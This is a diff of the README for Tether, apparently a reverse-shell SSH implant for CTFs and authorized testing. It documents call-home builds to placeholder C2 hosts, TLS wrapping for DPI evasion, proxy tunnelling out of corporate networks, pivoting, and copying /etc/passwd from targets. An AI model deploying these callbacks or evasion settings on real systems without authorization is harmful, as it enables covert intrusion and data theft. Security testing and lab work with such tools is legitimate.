@@ -1,140 +1,343 @@
 # Tether
 
-**A tiny, statically-linked SSH server with a reverse-connection feature — simple yet powerful remote access for CTFs, HackTheBox, and lab work.**
+**A tiny, statically linked SSH server with reverse-connection support for CTFs, security labs, and authorized testing.**
 
-Catching a shell with `netcat` is fine until muscle-memory `Ctrl-C` kills it, or you realise you have no TAB-completion, no history, and no clean way to move files. Tether drops a single <2 MB static binary on the target and gives you a real SSH server instead: fully interactive shells, SFTP file transfer, and port forwarding. It runs as either a **bind** shell (you connect in) or a **reverse** shell (the target dials home), and in reverse mode it keeps itself alive across drops.
+Tether provides a compact SSH endpoint that can be deployed as a single binary. It provides an interactive terminal, SFTP file transfer, and SSH port forwarding without requiring a full SSH server installation on the test system.
 
----
+Tether supports two connection configurations:
+
+* **Bind mode:** the SSH service listens for incoming connections.
+* **Reverse mode:** the test host establishes an outbound connection to a configured SSH endpoint.
+
+The binary is designed for temporary use in controlled environments such as CTFs, isolated security labs, development environments, and authorized assessments.
 
 ## Features
 
-* **Fully interactive shell** — PTY, TAB-completion, history, job control (see [Windows caveats](#windows-caveats))
-* **File transfer** over SFTP (`sftp`, `scp`)
-* **Local / remote / dynamic** port forwarding (works as a SOCKS proxy)
-* **Bind and reverse** modes
-* **Auto-reconnect** in reverse mode — exponential backoff plus SSH keepalives, so a dropped callback re-establishes itself instead of dying
-* **Graceful shutdown** on `Ctrl-C` / `SIGTERM`
-* **Cross-platform** — Linux, macOS, and Windows on both x86 and ARM (`amd64`, `386`, `arm64`, `armv7`)
-* **Customizable at build time** — bake in the password, key, shell, and call-home host/port so the dropped binary just works with no arguments
+* **Interactive terminal** with PTY, TAB completion, history, and job control
+* **File transfer** using SFTP and SCP
+* **SSH port forwarding** including local, remote, and dynamic forwarding
+* **Bind and reverse connection modes**
+* **Automatic reconnection** for temporary network interruptions
+* **Multi-catcher failover** with round-robin over a comma-separated target list
+* **Proxy-aware dialing** via HTTP CONNECT, HTTPS CONNECT, and SOCKS5
+* **Optional TLS wrapping** to blend into HTTPS traffic on port 443
+* **SSH keepalives** for connection monitoring
+* **Graceful shutdown** with `Ctrl-C` / `SIGTERM`
+* **Cross-platform** support for Linux, macOS, and Windows
+* **Multiple architectures** including `amd64`, `386`, `arm64`, and `armv7`
+* **Build-time configuration** for credentials, shell, and connection defaults
+* **Optional session recording** for lab documentation and troubleshooting
+* **Small static binaries**, typically under 2 MB
 
----
+## Intended Use
+
+Tether is intended for:
+
+* Capture-the-Flag competitions
+* Local security labs
+* Isolated test environments
+* Authorized penetration testing
+* Security research
+* Remote administration of systems where you have permission to connect
+
+Only deploy Tether on systems you own or are explicitly authorized to test.
 
 ## Requirements
 
-Running a prebuilt binary only needs what [Go itself supports](https://github.com/golang/go/wiki/MinimumRequirements#operating-systems):
+Running a prebuilt binary only requires an operating system supported by the corresponding Go runtime:
 
-* **Linux**: kernel 2.6.23+
-* **Windows**: Windows 7 / Server 2008R2+
-* **macOS**: any 64-bit Intel or Apple Silicon release supported by current Go
+* **Linux:** kernel 2.6.23+
+* **Windows:** Windows 7 / Server 2008R2+
+* **macOS:** 64-bit Intel or Apple Silicon releases supported by current Go
 
-To build it yourself:
+To build Tether yourself:
 
 * Go **1.24 or newer**
-* optionally `upx` for smaller binaries (`apt install upx-ucl`)
-
----
+* Optionally `upx` for smaller binaries
 
 ## Build
 
-The quickest path is the `build.sh` wrapper:
+The `build.sh` wrapper provides the simplest build workflow:
 
 ```shell
-$ ./build.sh          # build for your host OS/arch -> bin/tether (prints the login password)
-$ ./build.sh all      # full release matrix: Linux/Windows/macOS on x86 + ARM
-$ ./build.sh test     # bin/tether-test with predictable creds for local testing
+$ ./build.sh          # build for the local OS/architecture
+$ ./build.sh all      # build the complete release matrix
+$ ./build.sh test     # build a local testing binary
 ```
 
 Or use `make`:
 
 ```shell
-$ make                # host + full release matrix into bin/
-$ make compressed     # additionally pack every binary with upx
+$ make
+$ make compressed
 ```
 
-Binaries always land in `bin/`, named `tether-<os>-<arch>`.
+Binaries are written to `bin/` and use the naming format:
 
-### Baking in your own defaults
+```text
+tether-<os>-<arch>
+```
 
-Every setting can be compiled in so the target binary needs no flags. With `build.sh`, pass them as env vars:
+## Build-Time Configuration
 
-| Variable    | Effect                                                                                  |
-|-------------|-----------------------------------------------------------------------------------------|
-| `PASS`      | login password (default: random per build)                                              |
-| `PUB`       | authorized public key                                                                   |
-| `SHELL_BIN` | shell to spawn (default: `/bin/bash`)                                                    |
-| `LHOST`     | default call-home host — **makes the binary default to reverse mode**                   |
-| `LPORT`     | listen port (bind) or connect port (reverse); default `31337`                           |
-| `BPORT`     | port bound on the attacker after dialling home; **`0` = any free port**                 |
+Defaults can be compiled into the binary for repeatable lab deployments.
+
+| Variable    | Description                                                       |
+| ----------- | ----------------------------------------------------------------- |
+| `PASS`      | Login password                                                    |
+| `PUB`       | Authorized public key                                             |
+| `SHELL_BIN` | Shell or command interpreter                                      |
+| `LHOST`     | Default server address(es) for reverse mode (comma-separated)     |
+| `LPORT`     | Listening or connection port                                      |
+| `BPORT`     | Local port used for the reverse configuration                     |
+| `SESSLOG`   | Directory for optional session logs                               |
+| `PROXY`     | Outbound proxy URL (`http://`, `https://`, `socks5://`)           |
+| `SNI`       | TLS server name hint; also enables `-tls` by default when set     |
+
+For example, generate a dedicated test key:
 
 ```shell
-# Generate your own key and bake it in
 $ ssh-keygen -t ed25519 -f id_tether
-
-# A reverse build that phones home to 10.10.14.5:443 on any free local port
-$ LHOST=10.10.14.5 LPORT=443 BPORT=0 PUB="$(cat id_tether.pub)" ./build.sh all
 ```
 
-> The equivalent `make` variables are `RS_PASS`, `RS_PUB`, `RS_SHELL`, `LUSER`, `LHOST`, `LPORT`, `BPORT`, and `NOCLI` (any value strips all CLI parsing). Cross-compile a single target with `GOOS`/`GOARCH`, e.g. `GOARCH=arm64 GOOS=linux make compressed`. `go tool dist list` shows every target.
+A reverse configuration can then be built with:
 
----
+```shell
+$ LHOST=10.10.14.5 LPORT=443 BPORT=0 \
+  PUB="$(cat id_tether.pub)" ./build.sh all
+```
+
+To bake in an outbound proxy and TLS wrapping for restrictive networks:
+
+```shell
+$ LHOST=c2.example.com LPORT=443 \
+  PROXY=socks5://proxy.corp.com:1080 \
+  SNI=c2.example.com ./build.sh all
+```
+
+The equivalent `make` variables are `RS_PASS`, `RS_PUB`, `RS_SHELL`, `LUSER`, `LHOST`, `LPORT`, `BPORT`, and `NOCLI`.
+
+Cross-compile a specific target with `GOOS` and `GOARCH`:
+
+```shell
+$ GOARCH=arm64 GOOS=linux make compressed
+```
+
+Use `go tool dist list` to view supported Go targets.
 
 ## Usage
 
-Tether is just an SSH server, so any `ssh`/`sftp`/`scp` client works. Connect with any username — auth is by password or key, not by user.
+Tether implements a standard SSH interface, so standard OpenSSH clients can be used.
+
+### Interactive terminal
 
 ```shell
-# Interactive shell
-$ ssh  -p <PORT> <HOST>
+$ ssh -p <PORT> <HOST>
+```
 
-# One-off command
-$ ssh  -p <PORT> <HOST> whoami
+### Execute a command
 
-# File transfer
+```shell
+$ ssh -p <PORT> <HOST> whoami
+```
+
+### Transfer files
+
+```shell
 $ sftp -P <PORT> <HOST>
-
-# Dynamic port forwarding (SOCKS proxy on 9050)
-$ ssh  -p <PORT> -D 9050 <HOST>
 ```
 
-### Bind mode (you connect into the target)
+### Dynamic forwarding
 
 ```shell
-# Target
-target$ ./tether -l -p 2222
-
-# You
-you$ ssh -p 2222 <TARGET_IP>
+$ ssh -p <PORT> -D 9050 <HOST>
 ```
 
-Use `-p 0` to let the OS pick any free port — the chosen port is printed when you add `-v`.
+## CTF Quickstart
 
-### Reverse mode (target dials home)
+Each scenario shows what to run on **your machine** and on the **target**, then how to connect.
+
+> **Note on host key prompts:** Tether generates a new host key on every start.
+> SSH blocks the connection with `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED`
+> if it has seen a different key for that IP before. Since tether restarts
+> frequently in CTF use, `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
+> is added to all connect commands below to skip the prompt.
+
+---
+
+### 1. Basic shell (bind mode)
+
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v` |
+| **Connect** | `ssh -p 31337 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+
+---
+
+### 2. Port 443 — baked binary, no flags on target
+
+Build once on your machine:
 
 ```shell
-# You (catch the callback; can be your own OpenSSH daemon instead)
-you$ ./tether -v -l -p 443
-
-# Target
-target$ ./tether -v -p 443 <YOUR_IP>
+LHOST=<your-ip> LPORT=443 BPORT=0 ./build.sh linux-amd64
 ```
 
-The target connects out to your `:443` and remote-forwards a shell onto your loopback (default port `8888`, or any free port with `-b 0`). Then, from another terminal:
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v -p 443` |
+| **Target** | `./tether` — no flags, everything baked in |
+| **Connect** | `ssh -p <port-printed-in-log> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+
+`BPORT=0` lets the OS pick a free port; the chosen port appears in the verbose log.
+
+---
+
+### 3. Two-catcher failover
+
+| | Command |
+|---|---|
+| **Your machine (both VPS)** | `./tether -l -v -p 443` |
+| **Target** | `./tether vps1.example.com,vps2.example.com` |
+| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+
+Target tries each in round-robin. Backoff applies only after both fail.
+
+---
+
+### 4. Session recording
+
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v -L ~/sessions` |
+| **Target** | `./tether <your-ip>` |
+| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+| **Logs** | `ls ~/sessions/` — one timestamped file per session |
+
+---
+
+### 5. Through a SOCKS5 proxy
+
+Useful when the target can only reach the internet via an internal proxy:
 
 ```shell
-you$ ssh  -p 8888 127.0.0.1
-you$ sftp -P 8888 127.0.0.1
+# bake proxy in at build time
+PROXY=socks5://proxy.corp.com:1080 LHOST=<your-ip> ./build.sh linux-amd64
 ```
 
-If the callback drops, the target keeps redialling on its own (1 s → 30 s backoff), and keepalives detect a dead link within ~15 s.
+Or set an env var on the target at runtime:
 
-> Egress filtered? Reverse mode goes *out* over the port you choose — pick one the firewall allows (443, 53, 80 are good bets). This is plain SSH, so you can also catch the callback with your existing OpenSSH daemon.
-
-### SSH config shortcut
-
-Copy the [private key](assets/id_tether) to `~/.ssh/` and add this to `~/.ssh/config` to just run `ssh target` / `sftp target`:
-
+```shell
+ALL_PROXY=socks5://proxy.corp.com:1080 ./tether <your-ip>
 ```
-Host target
+
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v -p 443` |
+| **Target** | `./tether` (proxy baked in) or env var set |
+| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+
+---
+
+### 6. TLS-wrapped on port 443 (DPI evasion)
+
+Place a TLS terminator (nginx, haproxy, stunnel) in front of your listener,
+then build the target binary with TLS enabled:
+
+```shell
+SNI=<your-hostname> LHOST=<your-ip> LPORT=443 ./build.sh linux-amd64
+```
+
+| | Command |
+|---|---|
+| **Your machine** | nginx/stunnel on `:443` → `./tether -l :31337` |
+| **Target** | `./tether` — TLS enabled automatically via baked `SNI` |
+| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+
+Without a terminator, use `-tls` for a direct TLS-wrapped SSH connection to
+any listener that speaks TLS.
+
+---
+
+### 7. File transfer
+
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v` |
+| **Target** | `./tether <your-ip>` |
+| **Upload** | `scp -o StrictHostKeyChecking=no -P 8888 tool.elf <your-ip>:` |
+| **Download** | `scp -o StrictHostKeyChecking=no -P 8888 <your-ip>:/etc/passwd .` |
+| **Interactive** | `sftp -o StrictHostKeyChecking=no -P 8888 <your-ip>` |
+
+---
+
+### 8. Pivot — SOCKS proxy out through the target
+
+| | Command |
+|---|---|
+| **Your machine** | `./tether -l -v` |
+| **Target** | `./tether <your-ip>` |
+| **SOCKS** | `ssh -p 8888 -D 9050 -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
+| **Use** | `proxychains nmap -sV 10.10.10.0/24` |
+
+For a static port forward to a specific internal host:
+
+```shell
+ssh -p 8888 -L 8080:10.10.10.50:80 -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>
+```
+
+---
+
+## Bind Mode
+
+In bind mode, Tether listens for an incoming SSH connection.
+
+Start the service on the test host:
+
+```shell
+testhost$ ./tether -l -p 2222
+```
+
+Connect from the operator workstation:
+
+```shell
+operator$ ssh -p 2222 <TEST_HOST>
+```
+
+Use `-p 0` to allow the operating system to select an available port. The selected port is displayed when verbose logging is enabled with `-v`.
+
+## Reverse Mode
+
+Reverse mode allows a test host to establish the SSH connection to a configured server.
+
+Start the SSH endpoint:
+
+```shell
+operator$ ./tether -v -l -p 443
+```
+
+Start Tether on the test host:
+
+```shell
+testhost$ ./tether -v -p 443 <SERVER_IP>
+```
+
+The test host establishes the connection to the configured server. A local SSH endpoint is then available for the operator workstation:
+
+```shell
+operator$ ssh -p 8888 127.0.0.1
+operator$ sftp -P 8888 127.0.0.1
+```
+
+If the connection is interrupted, Tether automatically attempts to reconnect using an exponential backoff. SSH keepalives are used to detect interrupted sessions.
+
+Use a port appropriate for the network configuration of your authorized test environment.
+
+## SSH Configuration
+
+A dedicated test key can be placed in `~/.ssh/` and referenced from the SSH configuration:
+
+```text
+Host tether-test
     Hostname 127.0.0.1
     Port 8888
     IdentityFile ~/.ssh/id_tether
@@ -143,71 +346,230 @@ Host target
     UserKnownHostsFile /dev/null
 ```
 
-### Full flag reference
+The host can then be accessed with:
 
+```shell
+$ ssh tether-test
+$ sftp tether-test
 ```
+
+The relaxed host-key settings above are intended for disposable CTF and laboratory environments.
+
+## Command-Line Reference
+
+```text
 tether v1.3.0-dev
 
-Usage: tether [options] [[<user>@]<target>]
+Usage: tether [options] [[<user>@]<target>[,<target>...]]
 
-  -l   Listening (bind) mode; overrides the reverse scenario
-  -p   Listen port (bind) or connect port (reverse)        (default: 31337)
-  -b   Reverse only: local port to bind after dialling home (default: 8888; 0 = any)
-  -s   Shell to spawn for incoming connections              (default: /bin/bash)
-       On Windows, a path to 'ssh-shellhost.exe' to enhance pre-Win10 shells
-  -N   Deny all shell/exec/subsystem and local forwarding (remote forwarding only)
-  -v   Emit log output
-  -V   Print version and exit
+  -l     Listening (bind) mode
+  -p     Listen or connection port                 (default: 31337)
+  -b     Reverse mode local port                   (default: 8888; 0 = any)
+  -s     Shell or command interpreter              (default: /bin/bash)
+         On Windows, ssh-shellhost.exe can improve
+         terminal compatibility on older systems
+  -N     Disable shell/exec/subsystem and local forwarding
+  -L     Directory to record session output into (one file per session)
+  -tls   Wrap the outbound connection in TLS (reverse mode only)
+  -v     Enable diagnostic logging
+  -V     Print version and exit
 
-<target>   Optional [user@]host that enables reverse mode
+<target>   One or more comma-separated host[:port] addresses for reverse mode.
+           All targets are tried in round-robin order before exponential
+           backoff is applied. Backoff resets on any successful connection.
 ```
 
----
+## Local Testing
 
-## Testing locally
+Tether can be tested entirely on a single machine.
 
-Rehearse both scenarios on one machine. Build a binary with predictable creds (password `testpass123`, bundled key authorized):
+Build the test configuration:
 
 ```shell
 $ ./build.sh test
-$ chmod 600 assets/id_tether   # ssh refuses a world-readable private key
+$ chmod 600 assets/id_tether
 ```
 
-Add `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` to skip host-key prompts.
-
-**Bind:**
+For disposable local testing, OpenSSH can be configured to skip host-key prompts:
 
 ```shell
-victim$   ./bin/tether-test -v -l -p 2222
-attacker$ ssh  -i assets/id_tether -p 2222 localhost
-attacker$ sftp -P 2222 localhost                       # password: testpass123
+-o StrictHostKeyChecking=no
+-o UserKnownHostsFile=/dev/null
 ```
 
-**Reverse:**
+### Bind Test
+
+Start the service:
 
 ```shell
-attacker$ ./bin/tether-test -v -l -p 4444     # catcher (stays busy)
-victim$   ./bin/tether-test -v -p 4444 localhost
-# in a third terminal:
-attacker$ ssh  -i assets/id_tether -p 8888 localhost
+testhost$ ./bin/tether-test -v -l -p 2222
 ```
 
-For a real two-machine test, swap `localhost` on the victim side for the attacker's IP.
-
-Run the checks the CI runs:
+Connect from another terminal:
 
 ```shell
-$ go vet ./... && go test -race ./...
+operator$ ssh -i assets/id_tether -p 2222 localhost
+operator$ sftp -P 2222 localhost
 ```
 
----
+The test configuration uses the password:
 
-## Windows caveats
+```text
+testpass123
+```
 
-A fully interactive PowerShell relies on [ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and needs at least **Win10 Build 17763**. On older versions you still get a shell, but it can't handle virtual-terminal codes (arrow keys, `Ctrl-C`) — append `cmd`, i.e. `ssh <OPTIONS> <IP> cmd`.
+### Reverse Test
 
-For full interactivity on older Windows, drop [`ssh-shellhost.exe`](https://github.com/PowerShell/Win32-OpenSSH/releases/latest) next to `tether` and run with `-s ssh-shellhost.exe`.
+Start the local SSH endpoint:
 
----
+```shell
+operator$ ./bin/tether-test -v -l -p 4444
+```
 
-**Use it only on systems you own or are explicitly authorized to test.**
+Start the reverse configuration:
+
+```shell
+testhost$ ./bin/tether-test -v -p 4444 localhost
+```
+
+Connect through the resulting local endpoint:
+
+```shell
+operator$ ssh -i assets/id_tether -p 8888 localhost
+```
+
+For a two-machine laboratory test, replace `localhost` with the address of the SSH endpoint.
+
+## Multi-Catcher Failover
+
+Reverse mode accepts a comma-separated list of `host[:port]` targets. Tether
+tries each in round-robin order. Exponential backoff is applied only after all
+targets in the list have been exhausted, and resets on any successful connection.
+
+```shell
+testhost$ ./tether -v 10.10.14.5,10.10.14.6,backup.example.com:443
+```
+
+Targets with no port use the value from `-p`. Targets with an explicit port
+override it for that entry only.
+
+## Proxy-Aware Dialing
+
+Tether routes all outbound connections through a proxy when one is configured.
+Supported proxy schemes:
+
+| Scheme      | Description                                       |
+| ----------- | ------------------------------------------------- |
+| `http://`   | HTTP CONNECT with optional `user:pass` auth       |
+| `https://`  | HTTP CONNECT over a TLS-wrapped proxy connection  |
+| `socks5://` | SOCKS5 with optional RFC 1929 user/pass auth      |
+
+Set the proxy at build time:
+
+```shell
+$ PROXY=socks5://user:pass@proxy.corp.com:1080 ./build.sh
+```
+
+Or use standard environment variables at runtime (checked in this order):
+`HTTPS_PROXY`, `https_proxy`, `ALL_PROXY`, `all_proxy`.
+
+## TLS Wrapping
+
+The `-tls` flag wraps the outbound SSH connection in TLS before the SSH
+handshake. This makes the traffic indistinguishable from HTTPS to a firewall
+or DPI appliance.
+
+```shell
+testhost$ ./tether -tls -p 443 c2.example.com
+```
+
+The `SNI` build variable sets the TLS server name (used by a terminating
+reverse proxy to route to the correct backend). When `SNI` is baked in, `-tls`
+is enabled automatically.
+
+```shell
+$ SNI=c2.example.com LHOST=c2.example.com LPORT=443 ./build.sh
+```
+
+On the catcher side, place a TLS terminator (nginx, haproxy, stunnel) in front
+of Tether's SSH listener:
+
+```
+target  ──TLS(SNI=c2.example.com)──▶  :443 nginx  ──▶  tether -l :31337
+```
+
+## Session Logging
+
+Pass `-L <dir>` to record the output of every inbound session to a timestamped
+file in `<dir>` (one file per session, output only — input is never recorded):
+
+```shell
+operator$ ./tether -l -v -L ~/.tether/sessions
+```
+
+Or bake in a default log directory at build time:
+
+```shell
+$ SESSLOG=/var/log/tether ./build.sh
+```
+
+Each log file is named `<timestamp>-<peer>-<user>.log` and includes a metadata
+header line with the session kind, terminal dimensions, and start time.
+
+## Docker Test
+
+A `docker-compose.yml` is included for end-to-end local testing without
+touching the host network.
+
+```shell
+$ docker compose up --build
+```
+
+This starts a `catcher` (bind mode) and a `target` (reverse mode) on an
+isolated Docker bridge network. The target dials back automatically.
+
+Get a shell inside the target container:
+
+```shell
+$ docker compose exec catcher \
+    ssh -p 8888 -o StrictHostKeyChecking=no reverse@127.0.0.1
+# password: testpass123
+```
+
+Port 8888 is also exposed to the host, so you can connect directly:
+
+```shell
+$ ssh -p 8888 reverse@127.0.0.1
+```
+
+To test the SOCKS5 proxy path, uncomment the `proxy` service in
+`docker-compose.yml` and rebuild the target with the `PROXY` variable set.
+
+## Automated Checks
+
+Run the same checks used by CI:
+
+```shell
+$ go vet ./...
+$ go test -race ./...
+```
+
+## Windows Caveats
+
+A fully interactive PowerShell session uses Windows ConPTY and requires at least **Windows 10 Build 17763**.
+
+Older Windows versions still provide a command shell, but terminal features such as arrow keys and `Ctrl-C` may be limited.
+
+For improved compatibility, place `ssh-shellhost.exe` next to Tether and specify it with:
+
+```shell
+$ tether -s ssh-shellhost.exe
+```
+
+## Security and Authorization
+
+Tether provides remote terminal access and file-transfer capabilities. Treat deployed binaries and credentials as sensitive.
+
+For security testing, use Tether only within environments where you have explicit authorization.
+
+For CTFs and laboratory environments, use isolated infrastructure and disposable credentials whenever possible.
